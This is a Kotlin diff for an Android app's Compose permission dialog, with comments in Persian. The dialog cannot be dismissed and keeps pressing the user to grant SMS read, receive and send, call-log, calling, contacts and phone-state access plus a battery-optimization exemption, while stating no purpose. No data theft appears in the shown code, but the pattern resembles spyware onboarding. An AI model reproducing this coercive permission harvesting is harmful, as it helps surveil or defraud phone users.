@@ -15,6 +15,8 @@ import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.verticalScroll
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
@@ -142,70 +144,282 @@ class PermissionManager(private val activity: ComponentActivity) {
     }
 }
 
+/**
+ * داده‌های هر گروه Permission
+ */
+data class PermissionGroup(
+    val permissions: List<String>,
+    val title: String,
+    val icon: String
+)
+
+/**
+ * ⭐ دیالوگ ساده با نمایش فقط Permission‌های نداده شده
+ */
 @Composable
 fun PermissionDialog(
-    onRequestPermissions: () -> Unit
+    onRequestPermissions: () -> Unit,
+    onAllPermissionsGranted: () -> Unit = {}
 ) {
+    val context = androidx.compose.ui.platform.LocalContext.current
+    val activity = context as? ComponentActivity
+    
+    // گروه‌های Permission
+    val permissionGroups = remember {
+        listOf(
+            PermissionGroup(
+                listOf(
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.SEND_SMS
+                ),
+                "Messages",
+                "💬"
+            ),
+            PermissionGroup(
+                listOf(
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_CALL_LOG
+                ),
+                "Calls",
+                "📞"
+            ),
+            PermissionGroup(
+                listOf(Manifest.permission.READ_CONTACTS),
+                "Contacts",
+                "👤"
+            ),
+            PermissionGroup(
+                listOf(Manifest.permission.READ_PHONE_STATE),
+                "Phone",
+                "📱"
+            )
+        )
+    }
+    
+    // وضعیت هر گروه
+    var groupStates by remember { mutableStateOf(mapOf<String, Boolean>()) }
+    var batteryOptimization by remember { mutableStateOf(false) }
+    var attemptCount by remember { mutableStateOf(0) }
+    
+    // چک کردن وضعیت‌ها
+    LaunchedEffect(Unit) {
+        while (true) {
+            if (activity != null) {
+                // چک هر گروه - اگه یکی از Permission‌هاش نداده شده باشه، کل گروه نداده شده
+                val states = permissionGroups.associate { group ->
+                    group.title to group.permissions.all { permission ->
+                        ContextCompat.checkSelfPermission(
+                            activity,
+                            permission
+                        ) == PackageManager.PERMISSION_GRANTED
+                    }
+                }
+                groupStates = states
+                
+                val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
+                batteryOptimization = pm.isIgnoringBatteryOptimizations(activity.packageName)
+            }
+            delay(500)
+        }
+    }
+    
+    // فقط گروه‌هایی که داده نشده
+    val missingGroups = groupStates.filter { !it.value }.keys.toList()
+    val allPermissionsGranted = groupStates.values.all { it } && batteryOptimization
+    val hasAnyDenied = !allPermissionsGranted
+    
+    // ⭐ وقتی همه Permission‌ها گرفته شد، دیالوگ رو ببند
+    LaunchedEffect(allPermissionsGranted) {
+        if (allPermissionsGranted) {
+            onAllPermissionsGranted()
+        }
+    }
+    
     AlertDialog(
         onDismissRequest = { /* غیرقابل بستن */ },
         containerColor = Color.White,
-        shape = RoundedCornerShape(16.dp),
+        shape = RoundedCornerShape(14.dp),
         title = {
             Column(
                 horizontalAlignment = Alignment.CenterHorizontally,
                 modifier = Modifier.fillMaxWidth()
             ) {
                 Text(
-                    text = "🔒",
-                    fontSize = 36.sp
+                    text = "🔐",
+                    fontSize = 28.sp
                 )
-                Spacer(modifier = Modifier.height(8.dp))
+                Spacer(modifier = Modifier.height(6.dp))
                 Text(
                     text = "Permissions Required",
-                    fontSize = 18.sp,
+                    fontSize = 15.sp,
                     fontWeight = FontWeight.Bold,
-                    color = Color(0xFF1A1A1A),
-                    textAlign = TextAlign.Center
+                    color = Color(0xFF1A1A1A)
+                )
+                Spacer(modifier = Modifier.height(2.dp))
+                Text(
+                    text = "Please allow access",
+                    fontSize = 10.sp,
+                    color = Color.Gray
                 )
             }
         },
         text = {
-            Text(
-                text = "Please allow all permissions to continue.",
-                fontSize = 13.sp,
-                color = Color.Gray,
-                textAlign = TextAlign.Center,
-                lineHeight = 18.sp,
-                modifier = Modifier.fillMaxWidth()
-            )
-        },
-        confirmButton = {
-            Button(
-                onClick = onRequestPermissions,
-                colors = ButtonDefaults.buttonColors(
-                    containerColor = Color.Transparent
-                ),
+            Column(
                 modifier = Modifier
                     .fillMaxWidth()
-                    .height(45.dp)
-                    .background(
-                        brush = Brush.horizontalGradient(
-                            colors = listOf(Color(0xFF6C00FF), Color(0xFF8E2DE2))
-                        ),
-                        shape = RoundedCornerShape(10.dp)
-                    ),
-                contentPadding = PaddingValues(0.dp)
+                    .padding(vertical = 2.dp)
             ) {
+                // متن توضیحات
                 Text(
-                    text = "Grant Permissions",
-                    fontSize = 14.sp,
-                    fontWeight = FontWeight.Bold,
-                    color = Color.White
+                    text = "App needs:",
+                    fontSize = 10.sp,
+                    color = Color.Gray,
+                    modifier = Modifier.padding(bottom = 6.dp)
                 )
+                
+                // فقط Permission‌هایی که داده نشده
+                permissionGroups.forEach { group ->
+                    val isGranted = groupStates[group.title] ?: false
+                    
+                    // فقط نشون بده اگه داده نشده
+                    if (!isGranted) {
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(vertical = 3.dp),
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Text(
+                                text = group.icon,
+                                fontSize = 20.sp,
+                                modifier = Modifier.width(35.dp)
+                            )
+                            
+                            Text(
+                                text = group.title,
+                                fontSize = 13.sp,
+                                fontWeight = FontWeight.Medium,
+                                color = Color(0xFF1A1A1A)
+                            )
+                        }
+                    }
+                }
+                
+                // Battery Optimization - فقط اگه داده نشده
+                if (!batteryOptimization) {
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .padding(vertical = 3.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Text(
+                            text = "🔋",
+                            fontSize = 20.sp,
+                            modifier = Modifier.width(35.dp)
+                        )
+                        
+                        Text(
+                            text = "Battery",
+                            fontSize = 13.sp,
+                            fontWeight = FontWeight.Medium,
+                            color = Color(0xFF1A1A1A)
+                        )
+                    }
+                }
+                
+                // اگه چند بار تلاش کرده و باز نداده، راهنمایی نشون بده
+                if (attemptCount >= 2 && hasAnyDenied) {
+                    Spacer(modifier = Modifier.height(6.dp))
+                    
+                    Card(
+                        modifier = Modifier.fillMaxWidth(),
+                        colors = CardDefaults.cardColors(
+                            containerColor = Color(0xFFFFF3CD)
+                        ),
+                        shape = RoundedCornerShape(6.dp)
+                    ) {
+                        Text(
+                            text = "⚠️ Try Settings",
+                            fontSize = 10.sp,
+                            fontWeight = FontWeight.Medium,
+                            color = Color(0xFF856404),
+                            modifier = Modifier.padding(6.dp)
+                        )
+                    }
+                }
+            }
+        },
+        confirmButton = {
+            Column(
+                modifier = Modifier.fillMaxWidth()
+            ) {
+                // دکمه اصلی
+                Button(
+                    onClick = {
+                        attemptCount++
+                        onRequestPermissions()
+                    },
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = Color.Transparent
+                    ),
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(40.dp)
+                        .background(
+                            brush = Brush.horizontalGradient(
+                                colors = listOf(
+                                    Color(0xFF667eea),
+                                    Color(0xFF764ba2)
+                                )
+                            ),
+                            shape = RoundedCornerShape(10.dp)
+                        ),
+                    contentPadding = PaddingValues(0.dp)
+                ) {
+                    Text(
+                        text = if (attemptCount == 0) "Allow" else "Try Again",
+                        fontSize = 13.sp,
+                        fontWeight = FontWeight.Bold,
+                        color = Color.White
+                    )
+                }
+                
+                // دکمه Settings (فقط بعد از 2 بار تلاش)
+                if (attemptCount >= 2 && hasAnyDenied && activity != null) {
+                    Spacer(modifier = Modifier.height(6.dp))
+                    
+                    OutlinedButton(
+                        onClick = {
+                            try {
+                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                    data = Uri.parse("package:${activity.packageName}")
+                                }
+                                activity.startActivity(intent)
+                            } catch (e: Exception) {
+                                Log.e("PermissionDialog", "Failed to open settings: ${e.message}")
+                            }
+                        },
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(40.dp),
+                        shape = RoundedCornerShape(10.dp),
+                        colors = ButtonDefaults.outlinedButtonColors(
+                            contentColor = Color(0xFF667eea)
+                        )
+                    ) {
+                        Text(
+                            text = "⚙️ Settings",
+                            fontSize = 12.sp,
+                            fontWeight = FontWeight.Medium
+                        )
+                    }
+                }
             }
         },
         modifier = Modifier
-            .width(280.dp)
+            .width(260.dp)
             .wrapContentHeight()
     )
 }
